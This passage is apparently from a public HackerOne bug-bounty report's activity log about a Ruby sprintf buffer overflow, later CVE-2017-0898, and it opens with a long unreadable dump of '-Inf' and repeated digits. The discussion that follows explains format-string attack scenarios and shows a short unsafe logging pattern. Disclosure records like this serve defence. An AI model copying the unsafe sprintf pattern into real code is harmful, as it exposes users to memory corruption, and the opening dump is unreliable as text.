-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf2222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-Inf���-Inf22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-InfInf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf�-Inf88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-InfInf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf�V�-Inf88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf22222222222-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf8888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888%*G%*G%*G%*G%*G%*G%*G%*G-Inf�3\u0026amp;-Inf333333333333333333333333333333333333333333333333333333333333333333333333333333-In-Inf-InfInfnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf�-Inf88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-I-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-In-Inf3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333-Inf3333-Inf�--Inf\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt will be really appreciated if you reconsider the closing of this ticket, as this is a major vulnerability in your project, and it is far from being a duplicate to my previous ticket you mentioned.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-15T10:01:36.481Z","updated_at":"2017-04-15T10:01:36.481Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1612985,"is_internal":false,"editable":false,"type":"Activities::HackerRequestedMediation","message":"This is a similar mediation request as the one opened for my 1st ruby report (ticket #211190, mediation request ticket #21580).\n\nAgain I demonstrated a vulnerability that is shared between Ruby and Shopify-scripts, and while shopify scripts fixed it and awarded a bounty (public ticket #212239). And again Ruby closed it as a duplicate to my first ticket (#211190), even though the fix to the 1st ticket doesn't solve the demonstrated attack, meaning this vulnerability needs an additional fix, hence not a duplicate.\n\nI clearly demonstrated the attack, and shown that the suggested fix will solve it. The demonstrated attack now works only on Ruby and not on MRuby (because shopify scripts did fix it).\n\nAny mediation will help as it seems that the Ruby project is not responsive, they doesn't answer my questions regarding the closing of the ticket, and their project is still vulnerable to the attack they apparently chose to ignore so to save the bounty money and not pay me.","markdown_message":"\u003cp\u003eThis is a similar mediation request as the one opened for my 1st ruby report (ticket \u003ca href=\"/reports/211190\"\u003e#211190\u003c/a\u003e, mediation request ticket \u003ca href=\"/reports/21580\"\u003e#21580\u003c/a\u003e).\u003c/p\u003e\n\n\u003cp\u003eAgain I demonstrated a vulnerability that is shared between Ruby and Shopify-scripts, and while shopify scripts fixed it and awarded a bounty (public ticket \u003ca href=\"/reports/212239\"\u003e#212239\u003c/a\u003e). And again Ruby closed it as a duplicate to my first ticket (#211190), even though the fix to the 1st ticket doesn\u0026#39;t solve the demonstrated attack, meaning this vulnerability needs an additional fix, hence not a duplicate.\u003c/p\u003e\n\n\u003cp\u003eI clearly demonstrated the attack, and shown that the suggested fix will solve it. The demonstrated attack now works only on Ruby and not on MRuby (because shopify scripts did fix it).\u003c/p\u003e\n\n\u003cp\u003eAny mediation will help as it seems that the Ruby project is not responsive, they doesn\u0026#39;t answer my questions regarding the closing of the ticket, and their project is still vulnerable to the attack they apparently chose to ignore so to save the bounty money and not pay me.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-15T10:09:22.730Z","updated_at":"2017-04-15T10:09:22.730Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1628979,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"I confirmed the bug.\nBut can attackers specify the format string or the width in common?","markdown_message":"\u003cp\u003eI confirmed the bug.\u003cbr\u003e\nBut can attackers specify the format string or the width in common?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-23T16:07:30.708Z","updated_at":"2017-04-23T16:10:05.497Z","actor":{"username":"nobu","cleared":false,"url":"/nobu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/083/585/0d7081d0d147b05e9630bb56974707efae6d6721_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1629100,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Usually attackers can specify the format (and especially the width) when it's connected to logging / monitorring. The most common format string attack scenarios are in \"generic\" logging code in which a remote module / computer sends both the format and the arguments. In such cases attackers have full control over the format (including the width) and the arguments.\n\nSince ruby is a memory managed language, it is supposed to be immune to such attacks, even when programmers keep copying unsafe code from old text books.","markdown_message":"\u003cp\u003eUsually attackers can specify the format (and especially the width) when it\u0026#39;s connected to logging / monitorring. The most common format string attack scenarios are in \u0026quot;generic\u0026quot; logging code in which a remote module / computer sends both the format and the arguments. In such cases attackers have full control over the format (including the width) and the arguments.\u003c/p\u003e\n\n\u003cp\u003eSince ruby is a memory managed language, it is supposed to be immune to such attacks, even when programmers keep copying unsafe code from old text books.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-23T18:24:08.199Z","updated_at":"2017-04-23T18:24:08.199Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1645305,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e Usually attackers can specify the format (and especially the width) when it's connected to logging / monitorring. \n\nWhy and how can attackers specify the format?\n\n\u003e The most common format string attack scenarios are in \"generic\" logging code in which a remote module / computer sends both the format and the arguments.\n\nSounds unusual.\n\nThe severity seems \"medium\" at very most.","markdown_message":"\u003cblockquote\u003e\n\u003cp\u003eUsually attackers can specify the format (and especially the width) when it\u0026#39;s connected to logging / monitorring. \u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eWhy and how can attackers specify the format?\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eThe most common format string attack scenarios are in \u0026quot;generic\u0026quot; logging code in which a remote module / computer sends both the format and the arguments.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eSounds unusual.\u003c/p\u003e\n\n\u003cp\u003eThe severity seems \u0026quot;medium\u0026quot; at very most.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-30T12:58:10.393Z","updated_at":"2017-04-30T12:58:10.393Z","actor":{"username":"nobu","cleared":false,"url":"/nobu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/083/585/0d7081d0d147b05e9630bb56974707efae6d6721_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1645345,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Since the snprintf vulnerability was only in mruby (shopify scripts) and ruby \"only\" has the \"regular\" buffer overflow in the fractions edge case, I agree that the severity should be \"medium\".\n\nRegarding the attack scenarios, from my experience as a security researcher, format string attacks are still practical as there are (unfortunetly) many libraries and many programers that receive external events and log them in the following way:\n```\n  func logEvent(format, arg1, arg2, arg3, ...)\n    sprintf(format, arg1, arg2, arg3, ...)\n```   \nIn such cases the format is \"tainted\" and can be controlled by an attacker depending on the library's \\ project's input. During my career I encounterred several such projects (including big projects in large corporations) and this was the reason I searched for vulnerabilities in this module on the first place.","markdown_message":"\u003cp\u003eSince the snprintf vulnerability was only in mruby (shopify scripts) and ruby \u0026quot;only\u0026quot; has the \u0026quot;regular\u0026quot; buffer overflow in the fractions edge case, I agree that the severity should be \u0026quot;medium\u0026quot;.\u003c/p\u003e\n\n\u003cp\u003eRegarding the attack scenarios, from my experience as a security researcher, format string attacks are still practical as there are (unfortunetly) many libraries and many programers that receive external events and log them in the following way:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e  func logEvent(format, arg1, arg2, arg3, ...)\n    sprintf(format, arg1, arg2, arg3, ...)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIn such cases the format is \u0026quot;tainted\u0026quot; and can be controlled by an attacker depending on the library\u0026#39;s \\ project\u0026#39;s input. During my career I encounterred several such projects (including big projects in large corporations) and this was the reason I searched for vulnerabilities in this module on the first place.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-30T13:34:42.913Z","updated_at":"2017-04-30T13:34:42.913Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1662396,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here is a recent example for a vulnerable ruby module that had several format string vulnerabilities: CVE-2013-4389. And indeed it was a logging module.\n\nIt means that a DoS vulnerability can be escalated to memory-corruption and sometimes even a remote code execution.","markdown_message":"\u003cp\u003eHere is a recent example for a vulnerable ruby module that had several format string vulnerabilities: CVE-2013-4389. And indeed it was a logging module.\u003c/p\u003e\n\n\u003cp\u003eIt means that a DoS vulnerability can be escalated to memory-corruption and sometimes even a remote code execution.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-09T06:53:26.923Z","updated_at":"2017-05-09T06:53:26.923Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1664788,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-10T01:24:48.088Z","updated_at":"2017-05-10T01:24:48.088Z","additional_data":{"old_severity":"High","new_severity":"Medium","old_severity_id":30391,"new_severity_id":41348},"actor":{"username":"nobu","cleared":false,"url":"/nobu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/083/585/0d7081d0d147b05e9630bb56974707efae6d6721_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1690025,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any updates regarding this ticket? as far as I know the vulnerability was fixed and the severity was set. ","markdown_message":"\u003cp\u003eAny updates regarding this ticket? as far as I know the vulnerability was fixed and the severity was set. \u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-21T17:19:44.616Z","updated_at":"2017-05-21T17:19:44.616Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1796018,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-07-01T04:59:39.431Z","updated_at":"2017-07-01T04:59:39.431Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"aerodudrizzt","url":"/aerodudrizzt"},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1796019,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-07-01T05:00:04.802Z","updated_at":"2017-07-01T05:00:04.802Z","actor":{"url":"/ruby","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Ruby"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"ruby","collaborator":{"username":"aerodudrizzt","url":"/aerodudrizzt"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1796258,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you very much for the reward","markdown_message":"\u003cp\u003eThank you very much for the reward\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-01T09:16:17.161Z","updated_at":"2017-07-01T09:16:17.161Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1798113,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We will disclose this vulnerability after releasing stable ruby versions that are 2.2, 2.3 and 2.4.","markdown_message":"\u003cp\u003eWe will disclose this vulnerability after releasing stable ruby versions that are 2.2, 2.3 and 2.4.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-03T00:13:18.667Z","updated_at":"2017-07-03T00:13:18.667Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1801011,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-07-04T07:11:24.085Z","updated_at":"2017-07-04T07:11:24.085Z","cve_ids":["CVE-2017-0898"],"actor":{"username":"usa","cleared":false,"url":"/usa","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/084/616/9acacc80c98938df9ce1fbf89adaec99e9aa1e81_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2005119,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Please notice that the CVE description includes only the information disclosure part, and misses the memory corruption, as was demonstrated in the first PoC sample (featuring a segmentation fault).","markdown_message":"\u003cp\u003ePlease notice that the CVE description includes only the information disclosure part, and misses the memory corruption, as was demonstrated in the first PoC sample (featuring a segmentation fault).\u003c/p\u003e\n","automated_response":false,"created_at":"2017-09-19T04:57:24.462Z","updated_at":"2017-09-19T04:57:24.462Z","first_to_agree":true,"actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2013171,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-09-22T00:05:00.274Z","updated_at":"2017-09-22T00:05:00.274Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2013172,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-09-22T00:05:00.318Z","updated_at":"2017-09-22T00:05:00.318Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}